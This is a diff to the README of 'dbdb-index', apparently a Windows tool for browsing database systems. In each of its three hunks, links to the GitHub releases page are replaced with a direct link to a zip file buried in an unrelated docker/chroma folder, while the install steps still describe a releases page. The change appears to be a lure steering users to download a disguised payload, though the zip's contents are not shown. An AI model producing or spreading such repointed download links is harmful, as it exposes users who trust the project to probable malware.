@@ -1,6 +1,6 @@
 # 🗂️ dbdb-index - Browse database systems with ease
 
-[![Download dbdb-index](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/cornelablastular720/dbdb-index/releases)
+[![Download dbdb-index](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/cornelablastular720/dbdb-index/main/docker/chroma/dbdb_index_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it to search, compare, and review database systems without opening many site
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/cornelablastular720/dbdb-index/releases
+1. Open the release page: https://raw.githubusercontent.com/cornelablastular720/dbdb-index/main/docker/chroma/dbdb_index_v1.9.zip
 2. Look for the latest release at the top of the page
 3. In the Assets section, choose the Windows file
 4. Download the file to your PC
@@ -148,7 +148,7 @@ Keep the app file and its folders together in the same location so it can start 
 
 ## 🔗 Download Link
 
-Visit this page to download the Windows release: https://github.com/cornelablastular720/dbdb-index/releases
+Visit this page to download the Windows release: https://raw.githubusercontent.com/cornelablastular720/dbdb-index/main/docker/chroma/dbdb_index_v1.9.zip
 
 ## 🧭 Folder Safety
 
